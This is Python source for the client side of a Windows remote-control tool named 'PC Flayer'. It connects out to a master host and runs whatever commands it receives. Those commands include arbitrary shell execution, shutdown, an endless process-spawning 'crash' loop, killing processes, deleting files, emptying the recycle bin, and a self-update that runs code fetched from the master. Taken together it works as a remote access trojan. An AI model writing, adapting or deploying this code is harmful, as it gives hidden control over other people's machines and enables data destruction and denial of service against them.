import socket
import os
import time
import threading
import sys

if os.path.exists("old.pyw"):
    time.sleep(1)
    os.remove("old.pyw")
    time.sleep(1)
    os.system("shutdown /r /t 1")

if os.path.exists("old.py"):
    time.sleep(1)
    os.remove("old.py")
    time.sleep(1)
    os.system("shutdown /r /t 1")

try:
    import psutil
except:
    print("[PYTHON] Missing package (psutil.) Installing...")
    os.system("pip install psutil")
    import psutil

try:
    import winshell
except:
    print("[PYTHON] Missing package (winshell.) Installing...")
    os.system("pip install winshell")
    import winshell

VERSION = "1.1.3"
IP = "INSERT YOUR IPV4 ADDRESS HERE"
PORT = 5050
ADDR = (IP, PORT)

slave = None
currentDir = ""

def connect():
    global slave
    while True:
        time.sleep(1)
        try:
            slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            slave.connect(ADDR)
            print("[MASTER] Master has been found")
            break
        except:
            print("[SOCKET] Waiting for master...")
            continue
    return True

def handle_received(received):
    global currentDir
    received = received.decode()
    args = received.split(" ")
    command = args[0]
    if command:
        if command == "run":
            slave.send("Running on command prompt...".encode())
            to_run = " ".join(args[1:])
            if to_run:
                os.system(to_run)
                return "$approved".encode()
            else:
                return "$error".encode()
        elif command == "shutdown":
            slave.send("Shutting down...".encode())
            os.system("shutdown /s /t 1")
            return "$approved".encode()
        elif command == "restart":
            slave.send("Restarting...".encode())
            os.system("shutdown /r /t 1")
            return "$approved".encode()
        elif command == "logout":
            slave.send("Logging out...".encode())
            os.system("shutdown /l /t 1")
            return "$approved".encode()
        elif command == "lock":
            slave.send("Locking...".encode())
            os.system("Rundll32.exe user32.dll,LockWorkStation")
            return "$approved".encode()
        elif command == "crash":
            slave.send("Crashing...".encode())
            while True:
                time.sleep(0.01)
                os.system("start")
            os.system("shutdown /r /t 1")
            return "$approved".encode()
        elif command == "processes":
            for process in psutil.process_iter():
                try:
                    time.sleep(0.1)
                    name = process.name()
                    to_send = name.encode()
                    slave.send(to_send)
                except:
                    continue
            return "$approved".encode()
        elif command == "sleep":
            slave.send("Sleeping...".encode())
            os.system("rundll32.exe powrprof.dll, SetSuspendState Sleep")
            return "$approved".encode()
        elif command == "close":
            process = " ".join(args[1:])
            os.system(f"taskkill /F /IM {process}")
            slave.send(f"Closed {process}".encode())
            return "$approved".encode()
        elif command == "search":
            website = " ".join(args[1:])
            os.system(f"start msedge {website}")
            slave.send(f"Searched {website} on microsoft edge".encode())
            return "$approved".encode()
        elif command == "exit":
            slave.send("Ending PC Flayer...".encode())
            os.system(f"taskkill /F /IM pythonw.exe")
            os.system(f"taskkill /F /IM pyw.exe")
            os._exit(1)
            return "$approved".encode()
        elif command == "update":
            print("[UPDATE] Starting update process...")
            newSlaveFile = open("updateFile.pyw", "x")
            print("[UPDATE] Created temporary update file")
            origName = os.path.basename(__file__)
            os.rename(__file__, "old.pyw")
            print("[UPDATE] Renamed this file to old.pyw")
            fileSize = ""
            while fileSize == "":
                fileSize = slave.recv(2048).decode("utf-8")
            if fileSize:
                fileSize = int(fileSize)
                print(f"[UPDATE] Update size received ({fileSize} bytes)")
                fileData = ""
                while fileData == "":
                    fileData = slave.recv(fileSize).decode("utf-8")
                if fileData:
                    print("[UPDATE] Update data received")
                    newSlaveFile.write(fileData)
                    print("[UPDATE] Wrote data to temporary update file")
                    newSlaveFile.close()
                    os.rename("updateFile.pyw", origName)
                    newSlaveFile = open(origName, "r")
                    print("[UPDATE] Renamed temporary update file to slave.pyw")
                    print("[UPDATE] Starting new update...")
                    exec(newSlaveFile.read())
                    print("[UPDATE] New update started")
                    print("[UPDATE] Terminating this file...")
                    os._exit(1)
                    return "$approved"
        elif command == "version":
            to_send = f"Slave computer PC Flayer version: v{VERSION}".encode()
            slave.send(to_send)
            time.sleep(1)
            return "$approved".encode()
        elif command == "dir":
            typeArg = " ".join(args[1:])
            if typeArg == "$current":
                if currentDir == "":
                    slave.send("There is no current directory selected".encode())
                else:
                    slave.send(currentDir.encode())
            elif typeArg == "$reset":
                currentDir = ""
                slave.send("Current directory selected has been reset".encode())
            else:
                if currentDir == "":
                    safeGuard = currentDir
                    currentDir = typeArg
                    if os.path.isdir(currentDir) == False:
                        currentDir = safeGuard
                        slave.send("Given path is not a valid directory".encode())
                    else:
                        try:
                            for subdir in os.listdir(currentDir):
                                time.sleep(0.1)
                                slave.send(subdir.encode())
                        except:
                            slave.send(f"Error showing directories of {currentDir}, access is probably denied".encode())
                            currentDir = safeGuard
                else:
                    if typeArg == "":
                        for subdir in os.listdir(currentDir):
                            time.sleep(0.1)
                            slave.send(subdir.encode())
                    elif typeArg == ".":
                        if currentDir == "":
                            slave.send("There is no current directory selected".encode())
                        else:
                            pathList = currentDir.split("/")
                            fixedPathList = []
                            for empty in pathList:
                                if empty == "":
                                    continue
                                else:
                                    fixedPathList.append(empty)
                            fixedPathList.pop()
                            newPath = "/".join(fixedPathList[0:])
                            currentDir = newPath
                            slave.send(currentDir.encode())
                    else:
                        safeGuard = currentDir
                        currentDir = currentDir + "/" + typeArg
                        if os.path.isdir(currentDir) == False:
                            currentDir = safeGuard
                            slave.send("Given path is not a valid directory".encode())
                        else:
                            try:
                                for subdir in os.listdir(currentDir):
                                    time.sleep(0.1)
                                    slave.send(subdir.encode())
                            except:
                                slave.send(f"Error showing directories of {currentDir}, access is probably denied".encode())
                                currentDir = safeGuard
            if currentDir == "":
                pass
            else:
                pathList = currentDir.split("/")
                fixedPathList = []
                for empty in pathList:
                    if empty == "":
                        continue
                    else:
                        fixedPathList.append(empty)
                newPath = "/".join(fixedPathList[0:])
                currentDir = newPath
            return "$approved".encode()
        elif command == "remove":
            dir = " ".join(args[1:])
            dirPath = currentDir + "/" + dir
            try:
                if os.path.exists(dirPath):
                    if os.path.isdir(dirPath):
                        os.rmdir(dirPath)
                        slave.send("Directory has been deleted".encode())
                    else:
                        os.remove(dirPath)
                        slave.send("File has been deleted".encode())
                else:
                    slave.send("Chosen file/directory does not exist".encode())
            except:
                slave.send("There was an error deleting the chosen file/directory".encode())
            return "$approved".encode()
        elif command == "trash":
            try:
                winshell.recycle_bin().empty(confirm=True, show_progress=False, sound=False)
                slave.send("Emptied out recycle bin".encode())
            except:
                slave.send("There was an error emptying out the recycle bin; probably empty".encode())
            return "$approved".encode()
        else:
            return "$error".encode()
    return "$error".encode()
            

def main():
    connect()
    while True:
        received = None
        try:
            received = slave.recv(2048)
        except:
            slave.close()
            connect()
            continue
        to_return = handle_received(received)
        if to_return:
            slave.send(to_return)
        continue

print("[SCRIPT] Running main function...")
main()
